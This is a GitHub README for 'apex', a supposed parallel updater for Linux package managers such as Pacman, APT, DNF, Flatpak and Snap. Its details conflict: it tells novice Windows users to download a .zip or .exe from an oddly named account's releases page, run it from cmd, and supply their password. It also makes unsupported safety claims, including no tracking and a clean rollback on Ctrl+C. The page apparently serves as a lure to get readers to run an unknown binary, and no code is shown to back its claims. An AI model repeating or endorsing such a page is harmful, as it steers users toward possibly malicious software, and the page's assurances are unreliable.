# 🚀 apex - Update all your software at once

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pandemic-coppercolor329/apex/releases)

## 📦 What is apex?

Keeping a computer current involves many tasks. Most systems require you to update programs one by one. This process takes a long time. It forces you to wait for long bars to fill up for every single package manager.

Apex fixes this issue. It acts as a bridge between your computer and the programs that manage your software. Instead of waiting for one update to finish before the next one starts, Apex talks to all of them at the same time. You start the process with one command, and the tool handles the heavy lifting in the background. It finds updates for your core system, your apps, and your local files. 

This tool saves you time. You do not need to sit at your desk while your machine works. You trigger the update and move on to your actual work. Apex manages the queue, handles the errors, and ensures your system stays current.

## 💻 System Requirements

To run Apex, your computer needs a few basic items. 

- A Windows system with a Linux subsystem installed.
- Access to the command prompt or terminal.
- An active internet connection.
- A standard user account with permission to change system files.

If you have never used a terminal before, do not worry. You only need to copy and paste the commands provided in this guide.

## 📥 Getting the software

You need to download the latest version from our release page. Visit the link below to find the files.

[Download Apex from the Releases Page](https://github.com/Pandemic-coppercolor329/apex/releases)

On that page, you will see a list of recent versions. Look for the file ending in `.zip` or `.exe`. Click that link to save the file to your "Downloads" folder. 

Once the download finishes, open your "Downloads" folder. If the file is a zip folder, right-click it and choose "Extract All". This gives you a clear folder with the program inside. You now have the tool ready for use.

## ⚙️ Running the updater

You must open your terminal to run the tool. 

1. Press the Windows key on your keyboard.
2. Type "cmd" and press Enter.
3. Type `cd Downloads` and press Enter to move to your downloads folder.
4. If you extracted the folder, type `cd apex` and press Enter to enter the folder.
5. Type the command for the updater. Usually, this looks like `./apex` or `apex.exe`.
6. Press Enter.

The tool will now start. You will see text scrolling on the screen. This text shows the tool checking for new versions across all your installed software types. Do not close the window while this text appears. The tool works best when it has a clear path to finish its tasks.

## 🛠 Features

Apex includes smart features for daily use.

- **Parallel Processing:** The tool opens multiple connections at once. It does not wait for a previous download to finish. It pulls files while your system prepares the next package.
- **Error Tracking:** If a specific software package fails to update, the tool logs the error. It does not stop the entire update process. It finishes the rest and gives you a report at the end.
- **Broad Support:** The tool knows how to speak to Pacman, AUR, APT, DNF, Flatpak, and Snap. It does not matter which distribution or setting you prefer. 
- **Low Footprint:** The tool does not stay open in the background. It only runs when you ask it to run. It does not use your memory or processor when you do not need it.

## 📁 Understanding the output

When the tool finishes, you will see a summary table. This table shows three columns: The Name of the program, the Status, and the Time taken.

If a status says "Success," the software is now up to date. If it says "Failed," the tool will suggest a reason. Most failures happen because of a lost internet connection or a locked system file. You can run the command again after a few minutes to retry those specific updates.

## 🛡 Security and safety

We built Apex to be transparent. You can inspect the script if you wish. We do not track your usage data. We do not send your system logs to external servers. The tool only connects to the official servers for each software package manager. It uses its own logic to decide which updates to install. It acts only as a coordinator between you and your software providers.

## ❓ Common questions

**Does this damage my system?**
No. The tool only tells your existing software managers to update. It follows the exact same rules that your system uses when you update manually. If a package is broken, the tool will report it just as it would if you typed the command yourself.

**Can I stop it midway?**
Yes. You can press `Ctrl + C` in the terminal window to stop the process. The tool will close safely. Your system will return to its previous state. No partially updated files will corrupt your software.

**Do I need special permissions?**
Yes. The tool might ask for your user password. This is normal. It needs this to modify your system files. The tool does not store your password anywhere. It only uses it for the duration of the update task.

Keywords: apt, arch-aur, archlinux, aur, bash, debian, dnf, fedora, pacman, parallel, parallel-download, parallelization, shell-script, system-update, ubuntu, zsh